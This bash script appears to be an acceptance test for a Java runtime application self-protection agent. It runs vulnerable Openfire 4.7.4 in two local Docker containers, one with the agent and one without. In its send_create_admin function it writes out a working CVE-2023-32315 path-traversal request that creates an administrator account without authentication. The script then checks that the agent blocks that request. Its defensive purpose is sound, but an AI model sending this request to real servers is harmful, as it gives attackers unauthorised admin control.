#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_OPENFIRE_IMAGE:-vulhub/openfire:4.7.4}"
baseline_name="${OHMYRASP_VULHUB_OPENFIRE_BASELINE_NAME:-ohmyrasp-vulhub-openfire32315-baseline}"
protected_name="${OHMYRASP_VULHUB_OPENFIRE_PROTECTED_NAME:-ohmyrasp-vulhub-openfire32315-protected}"
baseline_port="${OHMYRASP_VULHUB_OPENFIRE_BASELINE_PORT:-18740}"
protected_port="${OHMYRASP_VULHUB_OPENFIRE_PROTECTED_PORT:-18741}"
host_agent_jar="$(pwd)/agent-java17/build/libs/ohmyrasp-agent-java17.jar"
baseline_dir="logs/vulhub-openfire-4.7.4-java17-baseline"
protected_dir="logs/vulhub-openfire-4.7.4-java17-protected"
protected_log="${protected_dir}/events.jsonl"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java17:agentJava17Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:9090" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:9090" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java17.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e INSTALL4J_ADD_VM_PARAMS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java17.jar -Dohmyrasp.java17.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java17.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    if [[ "$status" =~ ^(200|302)$ ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Openfire admin console at ${port}" >&2
  exit 1
}

send_create_admin() {
  local port="$1"
  local username="$2"
  local traversal="$3"
  local output="$4"
  curl -sS --path-as-is -o "$output" -w "%{http_code}" \
    -H 'Cookie: csrf=csrftoken' \
    "http://127.0.0.1:${port}/setup/setup-s/${traversal}/${traversal}/user-create.jsp?csrf=csrftoken&username=${username}&name=&email=&password=${username}&passwordConfirm=${username}&isadmin=on&create=Create+User" \
    || true
}

database_contains_user() {
  local name="$1"
  local username="$2"
  docker exec "$name" sh -c \
    "grep -q '${username}' /mnt/openfire/embedded-db/openfire.script /mnt/openfire/embedded-db/openfire.log"
}

database_contains_admin_jid() {
  local name="$1"
  local username="$2"
  docker exec "$name" sh -c \
    "grep -q 'admin.authorizedJIDs.*${username}@your-ip' /mnt/openfire/embedded-db/openfire.script /mnt/openfire/embedded-db/openfire.log"
}

wait_for_database_user() {
  local name="$1"
  local username="$2"
  for _ in $(seq 1 30); do
    if database_contains_user "$name" "$username" && database_contains_admin_jid "$name" "$username"; then
      return
    fi
    sleep 1
  done
  docker exec "$name" sh -c \
    "grep -n '${username}' /mnt/openfire/embedded-db/openfire.script /mnt/openfire/embedded-db/openfire.log || true" >&2
  echo "baseline Openfire did not persist administrator ${username}" >&2
  exit 1
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java17-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 17 startup event in Openfire protected container" >&2
  exit 1
fi
if ! grep -q '"request_hook":"installed"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing Java 17 request hook startup marker in Openfire protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Openfire protected startup produced a detection before the exploit request" >&2
  exit 1
fi

suffix="$(date +%s)$$"
baseline_user="ohmyraspbase${suffix}"
protected_user="ohmyraspprot${suffix}"
protected_lenient_user="ohmyrasplenient${suffix}"

baseline_status="$(
  send_create_admin \
    "$baseline_port" \
    "$baseline_user" \
    "%u002e%u002e" \
    "${baseline_dir}/unicode-create.response"
)"
if [[ "$baseline_status" != "200" ]]; then
  cat "${baseline_dir}/unicode-create.response" >&2 || true
  echo "baseline Openfire CVE-2023-32315 request returned HTTP ${baseline_status}" >&2
  exit 1
fi
wait_for_database_user "$baseline_name" "$baseline_user"

protected_status="$(
  send_create_admin \
    "$protected_port" \
    "$protected_user" \
    "%u002e%u002e" \
    "${protected_dir}/unicode-create.response"
)"
if [[ "$protected_status" != "500" ]]; then
  cat "${protected_dir}/unicode-create.response" >&2 || true
  echo "protected Openfire unicode traversal returned unexpected HTTP ${protected_status}" >&2
  exit 1
fi
if database_contains_user "$protected_name" "$protected_user"; then
  echo "protected Openfire persisted ${protected_user} despite Java17 RASP" >&2
  exit 1
fi

protected_lenient_status="$(
  send_create_admin \
    "$protected_port" \
    "$protected_lenient_user" \
    "%2>%2>" \
    "${protected_dir}/lenient-create.response"
)"
if [[ "$protected_lenient_status" != "500" ]]; then
  cat "${protected_dir}/lenient-create.response" >&2 || true
  echo "protected Openfire lenient hex traversal returned unexpected HTTP ${protected_lenient_status}" >&2
  exit 1
fi
if database_contains_user "$protected_name" "$protected_lenient_user"; then
  echo "protected Openfire persisted ${protected_lenient_user} despite Java17 RASP" >&2
  exit 1
fi

if ! grep -q '"algorithm":"java17_request_path_confusion".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java17_request_path_confusion block event for Openfire CVE-2023-32315" >&2
  exit 1
fi
if ! grep -q '%u002e%u002e' "$protected_log" || ! grep -q '%2>%2>' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Openfire protected log did not record both unicode and lenient traversal variants" >&2
  exit 1
fi

echo "vulhub Openfire 4.7.4 CVE-2023-32315 Java17 acceptance passed"
